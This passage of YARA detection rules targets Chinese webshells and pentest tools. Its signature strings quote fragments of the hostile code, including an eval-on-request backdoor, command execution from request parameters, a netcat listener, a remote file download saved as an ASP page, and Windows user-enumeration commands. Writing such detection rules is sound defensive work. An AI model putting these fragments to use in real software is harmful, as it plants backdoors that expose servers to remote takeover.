(https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"c.send loginuser & loginpass & mt & deldomain & quit\" fullword ascii\n        $s2 = \"loginpass = \\\"Pass \\\" & pass & vbCrLf\" fullword ascii\n        $s3 = \"b.send \\\"User go\\\" & vbCrLf & \\\"pass od\\\" & vbCrLf & \\\"site exec \\\" & cmd & vbCr\" ascii\n\n    condition:\n        filesize < 444KB and all of them\n}\n\nrule Webshell_CN__asp4_asp4_MSSQL__MSSQL_\n{\n    meta:\n        description = \"Webshell from CN Honker Pentest Toolset - from files asp4.txt, asp4.txt, MSSQL_.asp, MSSQL_.asp\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell__asp4_asp4_MSSQL__MSSQL_\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\"<form name=\\\"\\\"searchfileform\\\"\\\" action=\\\"\\\"?action=searchfile\\\"\\\" method=\\\"\" ascii\n        $s1 = \"\\\"<TD ALIGN=\\\"\\\"Left\\\"\\\" colspan=\\\"\\\"5\\\"\\\">[\\\"& DbName & \\\"]\" fullword ascii\n        $s2 = \"Set Conn = Nothing \" fullword ascii\n\n    condition:\n        filesize < 341KB and all of them\n}\n\nrule Webshell_CN__Injection_jmCook_jmPost_ManualInjection\n{\n    meta:\n        description = \"Webshell from CN Honker Pentest Toolset - from files Injection.exe, jmCook.asp, jmPost.asp, ManualInjection.exe\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell__Injection_jmCook_jmPost_ManualInjection\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"response.write  PostData(JMUrl,JmStr,JmCok,JmRef)\" fullword ascii\n        $s2 = \"strReturn=Replace(strReturn,chr(43),\\\"%2B\\\")  'JMDCW\" fullword ascii\n\n    condition:\n        filesize < 7342KB and all of them\n}\n\nrule Webshell_CN_cmfshell\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: cmfshell.cmf)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_cmfshell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<cfexecute name=\\\"C:\\\\Winnt\\\\System32\\\\cmd.exe\\\"\" fullword ascii\n        $s2 = \"<form action=\\\"<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>\\\" method=\\\"post\\\">\" fullword ascii\n\n    condition:\n        filesize < 4KB and all of them\n}\n\nrule Webshell_CN_PHP_php4\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php4.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_PHP_php4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"nc -l -vv -p port(\" fullword ascii\n\n    condition:\n        uint16(0) == 0x4850 and filesize < 1KB and all of them\n}\n\nrule Webshell_CN_Linux_2_6_Exploit\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: 2.6.9)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Linux_2_6_Exploit\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?\" fullword ascii\n\n    condition:\n        filesize < 56KB and all of them\n}\n\nrule Webshell_CN_ASP_asp2\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: asp2.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASP_asp2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<%=server.mappath(request.servervariables(\\\"script_name\\\"))%>\" fullword ascii\n        $s2 = \"webshell</font> <font color=#00FF00>\" fullword ascii\n        $s3 = \"Userpwd = \\\"admin\\\"   'User Password\" fullword ascii\n\n    condition:\n        filesize < 10KB and all of them\n}\n\nrule Webshell_CN_FTP_MYSQL_MSSQL_SSH\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: FTP MYSQL MSSQL SSH.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];\" fullword ascii\n        $s2 = \"Codz by <a href=\\\"http://www.sablog.net/blog\\\">4ngel</a><br />\" fullword ascii\n        $s3 = \"if ($conn_id = @ftp_connect($host, $ftpport)) {\" fullword ascii\n        $s4 = \"$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];\" fullword ascii\n        $s5 = \"<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>\" fullword ascii\n\n    condition:\n        filesize < 20KB and 3 of them\n}\n\nrule Webshell_CN_ASP_shell\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: shell.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASP_shell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"xPost.Open \\\"GET\\\",\\\"http://www.i0day.com/1.txt\\\",False //\" fullword ascii\n        $s2 = \"sGet.SaveToFile Server.MapPath(\\\"test.asp\\\"),2 //\" fullword ascii\n        $s3 = \"http://hi.baidu.com/xahacker/fuck.txt\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule Webshell_CN_PHP_php7\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php7.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_PHP_php7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; }\" ascii\n        $s1 = \"$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = iss\" ascii\n\n    condition:\n        filesize < 300KB and all of them\n}\n\nrule Webshell_CN_ASP_rootkit\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: rootkit.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASP_rootkit\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"set ss=zsckm.get(\\\"Win32_ProcessSta\\\"&uyy&\\\"rtup\\\")\" fullword ascii\n        $s1 = \"If jzgm=\\\"\\\"Then jzgm=\\\"cmd.exe /c net user\\\"\" fullword ascii\n\n    condition:\n        filesize < 80KB and all of them\n}\n\nrule Webshell_CN_jspshell\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: jspshell.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_jspshell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"else if(Z.equals(\\\"M\\\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Proce\" ascii\n        $s2 = \"String Z=EC(request.getParameter(Pwd)+\\\"\\\",cs);String z1=EC(request.getParameter\" ascii\n\n    condition:\n        filesize < 30KB and all of them\n}\n\nrule Webshell_CN_Serv_U_serv_u\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: serv-u.php)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Serv_U_serv_u\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"@readfile(\\\"c:\\\\\\\\winnt\\\\\\\\system32\\\\\" fullword ascii\n        $s2 = \"$sendbuf = \\\"PASS \\\".$_POST[\\\"password\\\"].\\\"\\\\r\\\\n\\\";\" fullword ascii\n        $s3 = \"$cmd=\\\"cmd /c rundll32.exe $path,install $openPort $activeStr\\\";\" fullword ascii\n\n    condition:\n        filesize < 435KB and all of them\n}\n\nrule Webshell_CN_WebShell\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: WebShell.cgi)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_WebShell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$login = crypt($WebShell::Configuration::password, $salt);\" fullword ascii\n        $s2 = \"my $error = \\\"This command is not available in the restricted mode.\\\\n\\\";\" fullword ascii\n        $s3 = \"warn \\\"command: '$command'\\\\n\\\";\" fullword ascii\n\n    condition:\n        filesize < 30KB and 2 of them\n}\n\nrule Webshell_CN_Tuoku_script_mssql_2\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: mssql.asp)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Tuoku_script_mssql_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"sqlpass=request(\\\"sqlpass\\\")\" fullword ascii\n        $s2 = \"set file=fso.createtextfile(server.mappath(request(\\\"filename\\\")),8,true)\" fullword ascii\n        $s3 = \"<blockquote> ServerIP:&nbsp;&nbsp;&nbsp;\" fullword ascii\n\n    condition:\n        filesize < 3KB and all of them\n}\n\nrule Webshell_CN_ASP_asp1\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: asp1.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASP_asp1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"SItEuRl=\" ascii\n        $s2 = \"<%@ LANGUAGE = VBScript.Encode %><%\" fullword ascii\n        $s3 = \"Server.ScriptTimeout=\" ascii\n\n    condition:\n        filesize < 200KB and all of them\n}\n\nrule Webshell_CN_Tools_cmd\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: cmd.jSp)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Tools_cmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"if(\\\"1752393\\\".equals(request.getParameter(\\\"Confpwd\\\"))){\" fullword ascii\n        $s1 = \"java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\\\"Conn\\\"\" ascii\n        $s2 = \"<%@ page import=\\\"java.io.*\\\" %>\" fullword ascii\n        $s3 = \"out.print(\\\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\\\");\" fullword ascii\n        $s4 = \"while((a=in.read(b))!=-1){\" fullword ascii\n        $s5 = \"out.println(new String(b));\" fullword ascii\n        $s6 = \"out.print(\\\"</pre>\\\");\" fullword ascii\n        $s7 = \"out.print(\\\"<pre>\\\");\" fullword ascii\n        $s8 = \"int a = -1;\" fullword ascii\n        $s9 = \"byte[] b = new byte[2048];\" fullword ascii\n\n    condition:\n        filesize < 3KB and 7 of them\n}\n\nrule Webshell_CN_trigger_drop\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: trigger_drop.php)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"trigger_drop\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"$_GET['returnto'] = 'database_properties.php';\" fullword ascii\n        $s1 = \"echo('<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=' . $_GET['returnto'] . '\\\">'\" ascii\n        $s2 = \"@mssql_query('DROP TRIGGER\" ascii\n        $s3 = \"if(empty($_GET['returnto']))\" fullword ascii\n\n    condition:\n        filesize < 5KB and all of them\n}\n\nrule Webshell_CN_InjectionParameters\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: InjectionParameters.vb)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"InjectionParameters\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Public Shared ReadOnly Empty As New InjectionParameters(-1, \\\"\\\")\" fullword ascii\n        $s1 = \"Public Class InjectionParameters\" fullword ascii\n\n    condition:\n        filesize < 13KB and all of them\n}\n\nrule Webshell_CN_users_list\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: users_list.php)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"users_list\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<a href=\\\"users_create.php\\\">Create User</a>\" fullword ascii\n        $s7 = \"$skiplist = array('##MS_AgentSigningCertificate##','NT AUTHORITY\\\\NETWORK SERVIC\" ascii\n        $s11 = \"&nbsp;<b>Default DB</b>&nbsp;\" fullword ascii\n\n    condition:\n        filesize < 12KB and all of them\n}\n\nrule Webshell_CN_trigger_modify\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: trigger_modify.php)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"trigger_modify\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<form name=\\\"form1\\\" method=\\\"post\\\" action=\\\"trigger_modify.php?trigger=<?php e\" ascii\n        $s2 = \"$data_query = @mssql_query('sp_helptext \\\\'' . urldecode($_GET['trigger']) . '\" ascii\n        $s3 = \"if($_POST['query'] != '')\" fullword ascii\n        $s4 = \"$lines[] = 'I am unable to read this trigger.';\" fullword ascii\n        $s5 = \"<b>Modify Trigger</b>\" fullword ascii\n\n    condition:\n        filesize < 15KB and all of them\n}\n\nrule Webshell_CN_Customize\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: Customize.aspx)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Customize\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ds.Clear();ds.Dispose();}else{SqlCommand cm = Conn.CreateCommand();cm.CommandTex\" ascii\n        $s2 = \"c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=tr\" ascii\n        $s3 = \"Stream WF=WB.GetResponseStream();FileStream FS=new FileStream(Z2,FileMode.Create\" ascii\n        $s4 = \"R=\\\"Result\\\\t|\\\\t\\\\r\\\\nExecute Successfully!\\\\t|\\\\t\\\\r\\\\n\\\";}Conn.Close();break;\" ascii\n\n    condition:\n        filesize < 24KB and all of them\n}\n\nrule Webshell_CN_oracle_data\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: oracle_data.php)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"oracle_data\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"$txt=fopen(\\\"oracle_info.txt\\\",\\\"w\\\");\" fullword ascii\n        $s1 = \"if(isset($_REQUEST['id']))\" fullword ascii\n        $s2 = \"$id=$_REQUEST['id'];\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule Webshell_CN_reDuhServers_reDuh\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: reDuh.jsp)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"reDuhServers_reDuh\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"out.println(\\\"[Error]Unable to connect to reDuh.jsp main process on port \\\" +ser\" ascii\n        $s4 = \"System.out.println(\\\"IPC service failed to bind to \\\" + servicePort);\" fullword ascii\n        $s17 = \"System.out.println(\\\"Bound on \\\" + servicePort);\" fullword ascii\n        $s5 = \"outputFromSockets.add(\\\"[data]\\\"+target+\\\":\\\"+port+\\\":\\\"+sockNum+\\\":\\\"+new Strin\" ascii\n\n    condition:\n        filesize < 116KB and all of them\n}\n\nrule Webshell_CN_item_old\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: item-old.php)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"item_old\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$sCmd = \\\"wget -qc \\\".escapeshellarg($sURL).\\\" -O \\\".$sFile;\" fullword ascii\n        $s2 = \"$sCmd = \\\"convert \\\".$sFile.\\\" -flip -quality 80 \\\".$sFileOut;\" fullword ascii\n        $s3 = \"$sHash = md5($sURL);\" fullword ascii\n\n    condition:\n        filesize < 7KB and 2 of them\n}\n\nrule Webshell_CN_Tools_2014\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: 2014.jsp)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Tools_2014\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"((Invoker) ins.get(\\\"login\\\")).invoke(request, response,\" fullword ascii\n        $s4 = \"program = \\\"cmd.exe /c net start > \\\" + SHELL_DIR\" fullword ascii\n        $s5 = \": \\\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\cmd.exe\\\")\" fullword ascii\n\n    condition:\n        filesize < 715KB and all of them\n}\n\nrule Webshell_CN_reDuhServers_reDuh_2\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: reDuh.php)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"reDuhServers_reDuh_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"errorlog(\\\"FRONTEND: send_command '\\\".$data.\\\"' on port \\\".$port.\\\" returned \\\".\" ascii\n        $s2 = \"$msg = \\\"newData:\\\".$socketNumber.\\\":\\\".$targetHost.\\\":\\\".$targetPort.\\\":\\\".$seq\" ascii\n        $s3 = \"errorlog(\\\"BACKEND: *** Socket key is \\\".$sockkey);\" fullword ascii\n\n    condition:\n        filesize < 57KB and all of them\n}\n\nrule Webshell_CN_Customize_2\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: Customize.jsp)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Customize_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"while((l=br.readLine())!=null){sb.append(l+\\\"\\\\r\\\\n\\\");}}\" fullword ascii\n        $s2 = \"String Z=EC(request.getParameter(Pwd)+\\\"\\\",cs);String z1=EC(request.getParameter\" ascii\n\n    condition:\n        filesize < 30KB and all of them\n}\n\nrule Webshell_ChinaChopper_one\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: one.asp)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ChinaChopper_one\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<%eval request(\" fullword ascii\n\n    condition:\n        filesize < 50 and all of them\n}\n\nrule Webshell_CN_old\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: old.php)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_old\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"$sCmd = \\\"wget -qc \\\".escapeshellarg($sURL).\\\" -O \\\".$sFile;\" fullword ascii\n        $s1 = \"$sURL = \\\"http://\\\".$sServer.\\\"/\\\".$sFile;\" fullword ascii\n        $s2 = \"chmod(\\\"/\\\".substr($sHash, 0, 2), 0777);\" fullword ascii\n        $s3 = \"$sCmd = \\\"echo 123> \\\".$sFileOut;\" fullword ascii\n\n    condition:\n        filesize < 6KB and all of them\n}\n\nrule Webshell_CN_item_301\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: item-301.php)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"item_301\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$sURL = \\\"301:http://\\\".$sServer.\\\"/index.asp\\\";\" fullword ascii\n        $s2 = \"(gov)\\\\\\\\.(cn)$/i\\\", $aURL[\\\"host\\\"])\" ascii\n        $s3 = \"$aArg = explode(\\\" \\\", $sContent, 5);\" fullword ascii\n        $s4 = \"$sURL = $aArg[0];\" fullword ascii\n\n    condition:\n        filesize < 3KB and 3 of them\n}\n\nrule Webshell_CN_item\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: item.php)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_item\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$sURL = \\\"http://\\\".$sServer.\\\"/\\\".$sWget;\" fullword ascii\n        $s2 = \"$sURL = \\\"301:http://\\\".$sServer.\\\"/\\\".$sWget;\" fullword ascii\n        $s3 = \"$sWget=\\\"index.asp\\\";\" fullword ascii\n        $s4 = \"$aURL += array(\\\"scheme\\\" => \\\"\\\", \\\"host\\\" => \\\"\\\", \\\"path\\\" => \\\"\\\");\" fullword ascii\n\n    condition:\n        filesize < 4KB and all of them\n}\n\nrule Webshell_CN_f3_diy\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: diy.asp)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"f3_diy\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<%@LANGUAGE=\\\"VBScript.Encode\\\" CODEPAGE=\\\"936\\\"%>\" fullword ascii\n        $s5 = \".black {\" fullword ascii\n\n    condition:\n        uint16(0) == 0x253c and filesize < 10KB and all of them\n}\n\nrule Webshell_ChinaChopper_temp\n{\n    meta:\n        description = \"Webshell 